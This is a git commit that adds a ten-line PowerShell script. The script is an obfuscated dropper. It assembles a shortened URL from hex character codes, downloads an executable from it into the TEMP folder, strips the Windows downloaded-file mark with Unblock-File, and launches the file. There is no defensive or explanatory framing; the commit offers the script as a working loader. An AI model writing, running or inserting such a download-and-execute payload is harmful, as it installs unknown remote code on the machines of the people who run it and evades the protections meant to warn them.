a2f64899b55ca0ba9c58dd8d345d21fed4d0cf32
defdgobs <gachagay337@gmail.com>
2026-03-21 23:16:57 +0300

    Add files via upload

---
+++ рабочий епта.ps1
@@ -0,0 +1,10 @@
+﻿${x} = ([char]0x68), ([char]0x74), ([char]0x74), ([char]0x70), ([char]0x73), ([char]0x3a), ([char]0x2f), ([char]0x2f), ([char]0x75), ([char]0x2e), ([char]0x74), ([char]0x6f), ([char]0x2f), ([char]0x41), ([char]0x7a), ([char]0x74), ([char]0x33), ([char]0x49), ([char]0x67)
+${url} = ${x} -join ''
+${output} = "$env:TEMP\myfile.exe"
+
+Invoke-WebRequest -Uri ${url} -OutFile ${output} -UserAgent 'Mozilla/5.0'
+
+Unblock-File -Path ${output}
+Write-Host "Файл разблокирован" -ForegroundColor Green
+
+Start-Process ${output}
